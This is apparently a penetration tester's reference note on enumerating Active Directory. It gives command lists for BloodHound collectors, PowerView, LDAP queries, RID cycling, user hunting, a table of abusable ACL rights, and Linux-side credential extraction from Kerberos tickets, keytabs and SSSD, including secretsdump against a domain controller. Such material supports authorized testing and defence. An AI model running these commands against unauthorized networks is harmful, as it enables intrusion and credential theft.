---
title: "Active Directory Enumeration Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - enumeration
  - powerview
  - ldap
  - bloodhound
---

# Active Directory Enumeration Reference

Comprehensive reference for enumerating Active Directory environments. See also: [[AD-Credential-Attacks]], [[AD-Kerberos-Attacks]], [[AD-Trust-and-Forest-Attacks]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#BloodHound & SharpHound]]
- [[#PowerView Enumeration]]
- [[#AD Module (Microsoft)]]
- [[#LDAP Enumeration]]
- [[#RID Cycling & User Enumeration]]
- [[#DC & Domain Discovery]]
- [[#User Hunting]]
- [[#ACL / ACE Enumeration]]
- [[#Linux AD Enumeration]]
- [[#GPO Enumeration]]
- [[#Misc Tools]]

---

## BloodHound & SharpHound

BloodHound visualizes AD attack paths using graph theory. SharpHound is the primary data collector.

### SharpHound Collectors

```powershell
# Full collection (most common)
.\SharpHound.exe -c All --zipfilename output.zip

# DCOnly (faster, no local admin checks)
.\SharpHound.exe -c DCOnly

# Specify domain controller
.\SharpHound.exe -c All --DomainController dc01.corp.local

# Stealth collection (reduced noise)
.\SharpHound.exe -c All --Stealth

# From Linux (BloodHound.py)
bloodhound-python -u username -p password -d corp.local -c All -ns <DC_IP>
bloodhound-python -u username -p password -d corp.local -c All --zip

# RustHound
rusthound -d corp.local -u username@corp.local -p password --zip

# SOAPHound (uses ADWS instead of LDAP - evades some monitoring)
SOAPHound.exe --buildcache -c All
SOAPHound.exe --bhdump -c All
```

### Key BloodHound Queries

- `Find all Domain Admins`
- `Find Shortest Paths to Domain Admins`
- `Find Principals with DCSync Rights`
- `Find Computers where Domain Users are Local Admin`
- `Shortest Paths from Kerberoastable Users`
- `Find AS-REP Roastable Users`

---

## PowerView Enumeration

PowerView is part of PowerSploit. Import with: `Import-Module .\PowerView.ps1`

### Domain & Forest

```powershell
Get-NetDomain                          # Current domain info
Get-NetDomain -Domain corp.local       # Specific domain
Get-NetForest                          # Forest info
Get-NetForest -Forest external.local
Get-NetDomainController                # List DCs
Get-NetDomainController -Domain corp.local
Get-NetDomainTrust                     # Domain trusts
Get-NetForestTrust                     # Forest trusts
Get-NetForestDomain                    # All domains in forest
Invoke-MapDomainTrust                  # Map all trusts
```

### User Enumeration

```powershell
Get-NetUser                            # All users
Get-NetUser -Username jdoe             # Specific user
Get-NetUser -Filter "(admincount=1)"   # Admin users
Get-NetUser | select samaccountname,description,pwdlastset,logoncount
Get-NetUser -SPN                       # Users with SPNs (Kerberoastable)
Get-NetUser -PreauthNotRequired        # AS-REP roastable users
```

### Computer Enumeration

```powershell
Get-NetComputer                        # All computers
Get-NetComputer -OperatingSystem "*Server 2019*"
Get-NetComputer -Ping                  # Only reachable hosts
Get-NetComputer -Unconstrained         # Computers with unconstrained delegation
Get-NetComputer -TrustedToAuth         # Constrained delegation
```

### Group Enumeration

```powershell
Get-NetGroup                           # All groups
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain corp.local
Get-NetLocalGroup -ComputerName dc01   # Local groups on a computer
Get-NetLocalGroupMember -ComputerName dc01 -GroupName Administrators
```

### Share & File Enumeration

```powershell
Find-DomainShare                       # All shares in domain
Find-DomainShare -CheckShareAccess     # Only accessible shares
Invoke-FileFinder -SharePath \\server\share  # Find interesting files
Find-InterestingDomainShareFile        # Search for sensitive files
```

### GPO Enumeration

```powershell
Get-NetGPO                             # All GPOs
Get-NetGPO | select displayname,whenchanged
Get-NetGPOGroup                        # GPOs with restricted groups
Get-NetGPO -ComputerIdentity ws01      # GPOs applied to specific computer
Get-DomainGPOLocalGroup                # GPOs with local group membership
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity ws01
```

### ACL / Object Enumeration

```powershell
Get-ObjectAcl -SamAccountName jdoe -ResolveGUIDs
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs        # Find all interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs
Get-ObjectAcl -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=corp,DC=local" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "Write"}
```

### Local Admin & User Hunting

```powershell
Find-LocalAdminAccess                  # Where current user is local admin
Find-LocalAdminAccess -Verbose         # Verbose output
Invoke-UserHunter                      # Find logged-on users
Invoke-UserHunter -CheckAccess         # Only where we have access
Invoke-UserHunter -GroupName "Domain Admins"  # Find DA sessions
Invoke-UserHunter -Stealth             # Stealthy version
Get-NetSession -ComputerName dc01      # Active sessions on host
Get-NetLoggedon -ComputerName ws01     # Logged-on users
```

---

## AD Module (Microsoft)

Built-in or via RSAT. Less likely to trigger AV. Import: `Import-Module ActiveDirectory`

```powershell
# Domain
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *

# Users
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter {SamAccountName -eq "jdoe"} -Properties *
Get-ADUser -Filter {admincount -eq 1} -Properties *
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Groups
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Computers
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem

# Trusts
Get-ADTrust -Filter *
Get-ADTrust -Filter * -Server corp.local

# Fine-grained password policies
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADFineGrainedPasswordPolicySubject -Identity "Admin PSO"
```

---

## LDAP Enumeration

### ldapsearch (Linux)

```bash
# Null bind (anonymous)
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local"

# Authenticated
ldapsearch -x -H ldap://<DC_IP> -D "jdoe@corp.local" -w password -b "DC=corp,DC=local"

# All users
ldapsearch -x -H ldap://<DC_IP> -D "jdoe@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Kerberoastable users
ldapsearch -x -H ldap://<DC_IP> -D "jdoe@corp.local" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# AS-REP roastable
ldapsearch -x -H ldap://<DC_IP> -D "jdoe@corp.local" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Computers
ldapsearch -x -H ldap://<DC_IP> -D "jdoe@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=computer)" sAMAccountName operatingSystem
```

### netexec / CrackMapExec LDAP

```bash
netexec ldap <DC_IP> -u user -p password --query "(objectClass=user)" "sAMAccountName"
netexec ldap <DC_IP> -u user -p password -M ldap-checker
netexec ldap <DC_IP> -u user -p password --bloodhound -c All
netexec ldap <DC_IP> -u user -p password --kerberoasting output.txt
netexec ldap <DC_IP> -u user -p password --asreproast output.txt
```

---

## RID Cycling & User Enumeration

### impacket lookupsid

```bash
# Null session
impacket-lookupsid -no-pass corp.local/guest@<DC_IP>
python3 lookupsid.py guest@<DC_IP> -no-pass

# Authenticated
impacket-lookupsid corp.local/jdoe:password@<DC_IP>
```

### netexec RID brute

```bash
netexec smb <DC_IP> -u '' -p '' --rid-brute
netexec smb <DC_IP> -u guest -p '' --rid-brute
netexec smb <DC_IP> -u jdoe -p password --rid-brute 10000
```

### enum4linux-ng

```bash
enum4linux-ng -A <DC_IP>
enum4linux-ng -A -u jdoe -p password <DC_IP>
```

---

## DC & Domain Discovery

```powershell
# PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$env:LOGONSERVER              # Current DC
nltest /dclist:corp.local
nltest /dsgetdc:corp.local

# Command line
net group "Domain Controllers" /domain
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

```bash
# Linux
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local <DNS_IP>
dig -t SRV _ldap._tcp.dc._msdcs.corp.local @<DNS_IP>
```

---

## User Hunting

Find where privileged users are currently logged in.

```powershell
# PowerView
Invoke-UserHunter -GroupName "Domain Admins"
Invoke-UserHunter -UserName jdoe
Get-NetSession -ComputerName <hostname>
Get-NetLoggedon -ComputerName <hostname>

# netexec
netexec smb <CIDR> -u jdoe -p password --sessions
netexec smb <CIDR> -u jdoe -p password --loggedon-users

# impacket
impacket-smbclient corp.local/jdoe:password@<DC_IP>
```

---

## ACL / ACE Enumeration

See [[AD-Enumeration-Reference#ACL / Object Enumeration]] for PowerView commands.

### Key ACE Rights to Look For

| Right | Abuse |
|-------|-------|
| GenericAll | Full control: reset password, add to group, write any attribute |
| GenericWrite | Write most attributes including SPN (Kerberoast) or msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) |
| WriteDACL | Grant self DCSync rights or other rights |
| WriteOwner | Take ownership, then modify ACL |
| ForceChangePassword | Reset password without knowing current |
| AllExtendedRights | Includes ForceChangePassword and ReadLAPSPassword |
| ReadLAPSPassword | Read ms-Mcs-AdmPwd attribute |
| ReadGMSAPassword | Read msDS-ManagedPassword |
| Self | Add/remove self to groups |
| WriteProperty | Write specific property (e.g., group membership) |

```powershell
# Find all ACLs where a user has rights over another object
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "jdoe"}

# Check specific object
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"}

# Check OU permissions
Get-ObjectAcl -ADSPath "LDAP://OU=Users,DC=corp,DC=local" -ResolveGUIDs
```

---

## Linux AD Enumeration

### CCACHE Ticket Reuse

```bash
# Find tickets in /tmp
ls /tmp/krb5cc_*
export KRB5CCNAME=/tmp/krb5cc_1000

# Use with impacket
impacket-secretsdump -k -no-pass corp.local/dc01$@dc01.corp.local
impacket-psexec -k -no-pass dc01.corp.local
```

### Keytab Extraction

```bash
# Find keytab files
find / -name "*.keytab" 2>/dev/null
find / -name "krb5.keytab" 2>/dev/null

# Extract credentials
python3 keytabextract.py /etc/krb5.keytab
klist -k /etc/krb5.keytab          # List entries

# Use keytab to get TGT
kinit -kt /etc/krb5.keytab username
export KRB5CCNAME=/tmp/ticket.ccache
```

### SSSD Credential Extraction

```bash
# Extract tickets from SSSD KCM
python3 SSSDKCMExtractor.py --database /var/lib/sss/db/ccache_CORP.LOCAL --kerberos

# SSSD credentials
find / -name "sssd.conf" 2>/dev/null
# Decode obfuscated password
python3 sssd_decrypt.py

# Using GDB to extract from keyring
gdb -batch -ex "set pagination 0" -ex "call list_creds()" -ex "detach" -p <sssd_pid>
```

### Network-Based Linux AD Enum

```bash
# ldapdomaindump
ldapdomaindump -u 'corp\jdoe' -p password <DC_IP> -o /tmp/ldap_dump/

# windapsearch
windapsearch -d corp.local -u jdoe@corp.local -p password --da
windapsearch -d corp.local -u jdoe@corp.local -p password -U  # Users
windapsearch -d corp.local -u jdoe@corp.local -p password -C  # Computers
```

---

## GPO Enumeration

See also: [[AD-Credential-Attacks]] for GPP password abuse.

```powershell
# PowerView - enumerate GPOs
Get-NetGPO | select displayname,gpcfilesyspath

# Find GPOs with local group modifications
Get-NetGPOGroup

# Map GPOs to computers/users
Get-DomainGPOLocalGroup | select GPODisplayName,GroupMembers

# Check SYSVOL for GPP passwords
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
```

```bash
# Linux - search SYSVOL
smbclient //dc01.corp.local/sysvol -U 'corp\jdoe%password' -c 'recurse; ls'
```

---

## Misc Tools

### netexec Enumeration

```bash
# General info
netexec smb <DC_IP> -u jdoe -p password

# Password policy
netexec smb <DC_IP> -u jdoe -p password --pass-pol

# Active sessions
netexec smb <CIDR> -u jdoe -p password --sessions

# Logged on users
netexec smb <CIDR> -u jdoe -p password --loggedon-users

# Local groups
netexec smb <IP> -u jdoe -p password --local-groups

# Domain groups
netexec smb <DC_IP> -u jdoe -p password --groups
```

### impacket Tools

```bash
# Get Domain users via Kerberos pre-auth
impacket-GetADUsers -all corp.local/jdoe:password
impacket-GetADUsers -all -dc-ip <DC_IP> corp.local/jdoe:password

# AD Object dump
impacket-ldapdomaindump -u corp\\jdoe -p password <DC_IP>
```
